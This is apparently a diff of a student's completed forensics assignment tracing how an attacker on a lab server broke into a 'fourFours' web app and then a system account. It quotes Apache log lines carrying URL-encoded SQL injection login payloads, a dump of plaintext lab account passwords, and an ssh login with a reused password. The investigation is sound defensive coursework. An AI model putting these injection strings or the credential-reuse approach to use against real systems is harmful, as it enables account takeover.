@@ -11,8 +11,6 @@ to elevate privileges. Fill in the sections below that apply.
 +-----------------------------------------------------------------------+
 	A description of hackers approach, while an unprivileged user.
 
-		YOUR ANSWER GOES HERE
-
 		On November 11 at 12:46:27 someone issued a get request to the fourFours
 		application and recieved the fourFours index page. They then tried issuing
 		several commands to the server like logout and deleteExpression. They are also
@@ -194,79 +192,152 @@ to elevate privileges. Fill in the sections below that apply.
 +-----------------------------------------------------------------------+
 | As Privileged for SERVICE the attackers approach was                  |
 +-----------------------------------------------------------------------+
-	First SERVICE account broken: YOUR ANSWER GOES HERE
-	Date and time attacker broke account: YOUR ANSWER GOES HERE
-	Evidence for the above (command, output, explanation):
+	First SERVICE account broken: anne
+	Date and time attacker broke account: 11/Nov/2020:13:19:27
+	Evidence for the above (command, output, explanation): cat apache2/access.log | grep "lion%"
 
-		YOUR ANSWER GOES HERE
+	172.16.107.140 - - [11/Nov/2020:13:19:27 -0500] "GET /fourFours/index.php?user=%27+or+%28username+like+%27anne%25%27+and+passwd+like+%27lion%25%27%29%3B+--&password=&operation=login HTTP/1.1" 200 65788 "-" "Python-urllib/3.8"
 
 	-----------------------------------------------------------------
 	A description of hackers approach, while an unprivileged user.
 
-		YOUR ANSWER GOES HERE
+		The hacker ran some sort of bruce force sql injection attack on the fourFours service.
+		Maybe done using sqlmap, as the service is sql injectable. They broke multiple accounts
+		for fourFours service using this method.
 
 	-----------------------------------------------------------------
 	How I know: (command I executed, sample of the evidence, explanation)
 	-----------------------------------------------------------------
-	COMMAND: YOUR ANSWER GOES HERE
+	COMMAND: sudo cat /var/www/fourFours/dev/schema.sql | grep "INSERT INTO"
 
-	EVIDENCE: (sample of the evidence)
+	EVIDENCE:
 
-		YOUR ANSWER GOES HERE
+			INSERT INTO account(firstName, lastName, username, passwd) values('Anne','Lion','anne','lion');
+			INSERT INTO account(firstName, lastName, username, passwd) values('Linda','Swim','lindah20','fourfivesix');
+			INSERT INTO account(firstName, lastName, username, passwd) values('Abagail','Silver','coins','silverisbetter');
+			INSERT INTO account(firstName, lastName, username, passwd) values('Bill','Gates','bill','billGatesIsGreat');
+			INSERT INTO account(firstName, lastName, username, passwd) values('Jessie','Burn','matchstick','password1');
+			INSERT INTO account(firstName, lastName, username, passwd) values('Annie','Cup','coffee','password');
+			INSERT INTO account(firstName, lastName, username, passwd) values('Diane','Bassell','ssll','passw0rd');
+			INSERT INTO account(firstName, lastName, username, passwd) values('Steve','Mountain','cliff','cliff');
+			INSERT INTO account (username, passwd, firstName, lastName) values ('arnold@cs.toronto.edu', 'sdxfdsgger', 'Arnold', 'Rosenbloom');
+			INSERT INTO account(firstName, lastName, username, passwd) values('Jay','Perlmuter','perl','perl');
+			INSERT INTO account(firstName, lastName, username, passwd) values('Peter','Piper','pickApeck','Peter');
+			INSERT INTO account(firstName, lastName, username, passwd) values('Jen','Binghampton','hotel','jbh');
+			INSERT INTO account(firstName, lastName, username, passwd) values('David','Kleinman','dk@gmail.com','esrever');
+			INSERT INTO account(firstName, lastName, username, passwd) values('Jesse','Kowalski','eightball@gmail.com','badPassword');
+			INSERT INTO account(firstName, lastName, username, passwd) values('Ivanna','Grant','ivanna','grant');
 
-	EXPLANATION: (explain the evidence)
 
-		YOUR ANSWER GOES HERE
+	EXPLANATION:
+
+		These are all the accounts and passwords for the service fourFours.
 
 	-----------------------------------------------------------------
-	COMMAND: YOUR ANSWER GOES HERE
+	COMMAND:
+						cat /var/log/apache2/access.log | grep "lion%"
+						cat /var/log/apache2/access.log | grep "fourfivesix%"
+						cat /var/log/apache2/access.log | grep "password1%"
+						cat /var/log/apache2/access.log | grep "passw0rd%"
+						cat /var/log/apache2/access.log | grep "passwd+like+%27cliff%"
+						cat /var/log/apache2/access.log | grep "passwd+like+%27perl%"
+						cat /var/log/apache2/access.log | grep "jbh%"
+						cat /var/log/apache2/access.log | grep "esrever%"
+						cat /var/log/apache2/access.log | grep "badPassword%"
+						cat /var/log/apache2/access.log | grep "grant%"
+						grep "billGatesIsGreat%" /var/log/apache2/access.log
 
-	EVIDENCE: (sample of the evidence)
+	EVIDENCE:
 
-		YOUR ANSWER GOES HERE
+			172.16.107.140 - - [11/Nov/2020:13:19:27 -0500] "GET /fourFours/index.php?user=%27+or+%28username+like+%27anne%25%27+and+passwd+like+%27lion%25%27%29%3B+--&password=&operation=login HTTP/1.1" 200 65788 "-" "Python-urllib/3.8"
+			172.16.107.140 - - [11/Nov/2020:13:19:49 -0500] "GET /fourFours/index.php?user=%27+or+%28username+like+%27lindah20%25%27+and+passwd+like+%27fourfivesix%25%27%29%3B+--&password=&operation=login HTTP/1.1" 200 65443 "-" "Python-urllib/3.8"
+			172.16.107.140 - - [11/Nov/2020:13:19:53 -0500] "GET /fourFours/index.php?user=%27+or+%28username+like+%27matchstick%25%27+and+passwd+like+%27password1%25%27%29%3B+--&password=&operation=login HTTP/1.1" 200 65444 "-" "Python-urllib/3.8"
+			172.16.107.140 - - [11/Nov/2020:13:20:01 -0500] "GET /fourFours/index.php?user=%27+or+%28username+like+%27ssll%25%27+and+passwd+like+%27passw0rd%25%27%29%3B+--&password=&operation=login HTTP/1.1" 200 65443 "-" "Python-urllib/3.8"
+			172.16.107.140 - - [11/Nov/2020:13:19:32 -0500] "GET /fourFours/index.php?user=%27+or+%28username+like+%27cliff%25%27+and+passwd+like+%27cliff%25%27%29%3B+--&password=&operation=login HTTP/1.1" 200 65674 "-" "Python-urllib/3.8"
+			172.16.107.140 - - [11/Nov/2020:13:19:56 -0500] "GET /fourFours/index.php?user=%27+or+%28username+like+%27perl%25%27+and+passwd+like+%27perl%25%27%29%3B+--&password=&operation=login HTTP/1.1" 200 65542 "-" "Python-urllib/3.8"
+			172.16.107.140 - - [11/Nov/2020:13:19:41 -0500] "GET /fourFours/index.php?user=%27+or+%28username+like+%27hotel%25%27+and+passwd+like+%27jbh%25%27%29%3B+--&password=&operation=login HTTP/1.1" 200 65542 "-" "Python-urllib/3.8"
+			172.16.107.140 - - [11/Nov/2020:13:19:35 -0500] "GET /fourFours/index.php?user=%27+or+%28username+like+%27dk%25%27+and+passwd+like+%27esrever%25%27%29%3B+--&password=&operation=login HTTP/1.1" 200 65544 "-" "Python-urllib/3.8"
+			172.16.107.140 - - [11/Nov/2020:13:19:38 -0500] "GET /fourFours/index.php?user=%27+or+%28username+like+%27eightball%25%27+and+passwd+like+%27badPassword%25%27%29%3B+--&password=&operation=login HTTP/1.1" 200 65544 "-" "Python-urllib/3.8"
+			172.16.107.140 - - [11/Nov/2020:13:19:43 -0500] "GET /fourFours/index.php?user=%27+or+%28username+like+%27ivanna%25%27+and+passwd+like+%27grant%25%27%29%3B+--&password=&operation=login HTTP/1.1" 200 65545 "-" "Python-urllib/3.8"
+			172.16.107.140 - - [11/Nov/2020:13:19:31 -0500] "GET /fourFours/index.php?user=%27+or+%28username+like+%27bill%25%27+and+passwd+like+%27billGatesIsGreat%25%27%29%3B+--&password=&operation=login HTTP/1.1" 200 65442 "-" "Python-urllib/3.8"
+
 
 	EXPLANATION: (explain the evidence)
 
-		YOUR ANSWER GOES HERE
+		These are all the broken accounts for the service fourFours. We can see anne was the first one broken.
+		I made the commands by grepping for the password of each account in the database.
+
 	-----------------------------------------------------------------
 
 +-----------------------------------------------------------------------+
 | As a system user: before obtaining root                               |
 +-----------------------------------------------------------------------+
-	First system account broken: YOUR ANSWER GOES HERE
-	Date and time attacker broke account: YOUR ANSWER GOES HERE
-	Evidence for the above (command, output, explanation):
+	First system account broken: bill
+	Date and time attacker broke account: Wed Nov 11 13:24
+	Evidence for the above (command, output, explanation): last | grep "172.16.107.140"
 
-		YOUR ANSWER GOES HERE
+	bill     pts/0        172.16.107.140   Fri Nov 13 08:41 - down   (00:00)
+	bill     pts/0        172.16.107.140   Fri Nov 13 08:15 - down   (00:23)
+	bill     pts/0        172.16.107.140   Wed Nov 11 14:18 - 14:20  (00:02)
+	charlie  pts/1        172.16.107.140   Wed Nov 11 13:39 - 13:39  (00:00)
+	bill     pts/0        172.16.107.140   Wed Nov 11 13:24 - 14:18  (00:53)
+
+	So we can see by grepping for the attacker's ip address, the first time they signed in
+	as bill was Wed Nov 11 at 13:24, shortly after they broke the fourFours service at 13:19.
 
 	-----------------------------------------------------------------
 	A description of hackers approach, while an unprivileged user.
 
-		YOUR ANSWER GOES HERE
+		The hacker ran some sort of bruce force sql injection attack on the fourFours service.
+		Maybe done using sqlmap, as the service is sql injectable. They broke multiple accounts
+		for fourFours service using this method. One of these fourFours accounts happened to also
+		have a system account with the same password, so they got into the system this way.
 
 	-----------------------------------------------------------------
 	How I know: (command I executed, sample of the evidence, explanation)
 	-----------------------------------------------------------------
-	COMMAND: YOUR ANSWER GOES HERE
+	COMMAND: sudo cat /var/www/fourFours/dev/schema.sql | grep "bill"
+
+					 grep "billGatesIsGreat%" /var/log/apache2/access.log
 
 	EVIDENCE: (sample of the evidence)
 
-		YOUR ANSWER GOES HERE
+		INSERT INTO account(firstName, lastName, username, passwd) values('Bill','Gates','bill','billGatesIsGreat');
+
+		172.16.107.140 - - [11/Nov/2020:13:19:31 -0500] "GET /fourFours/index.php?user=%27+or+%28username+like+%27bill%25%27+and+passwd+like+%27billGatesIsGreat%25%27%29%3B+--&password=&operation=login HTTP/1.1" 200 65442 "-" "Python-urllib/3.8"
 
 	EXPLANATION: (explain the evidence)
 
-		YOUR ANSWER GOES HERE
+		So we can see that bill is a user account in the fourFours service with password billGatesIsGreat.
+		We can also see from grepping for bill's password in the apache2 log that bill's account was broken
+		by the attacker (their ip-address and it was part of the brute force attack).
 
 	-----------------------------------------------------------------
-	COMMAND: YOUR ANSWER GOES HERE
+	COMMAND: ssh bill@192.168.111.129
 
 	EVIDENCE: (sample of the evidence)
 
-		YOUR ANSWER GOES HERE
+						kali@kali:~$ ssh bill@192.168.111.129
+						bill@192.168.111.129's password:
+						Linux ubuntuA3 2.6.24-26-server #1 SMP Tue Dec 1 18:26:43 UTC 2009 x86_64
+
+						The programs included with the Ubuntu system are free software;
+						the exact distribution terms for each program are described in the
+						individual files in /usr/share/doc/*/copyright.
+
+						Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+						applicable law.
+
+						To access official Ubuntu documentation, please visit:
+						http://help.ubuntu.com/
+						Last login: Fri Nov 13 08:41:15 2020 from 172.16.107.140
+						bill@ubuntuA3:~$
+						bill@ubuntuA3:~$
 
 	EXPLANATION: (explain the evidence)
 
-		YOUR ANSWER GOES HERE
+				So with username bill and password billGatesIsGreat we can get into the system. 
+
 	-----------------------------------------------------------------
 
 +-----------------------------------------------------------------------+
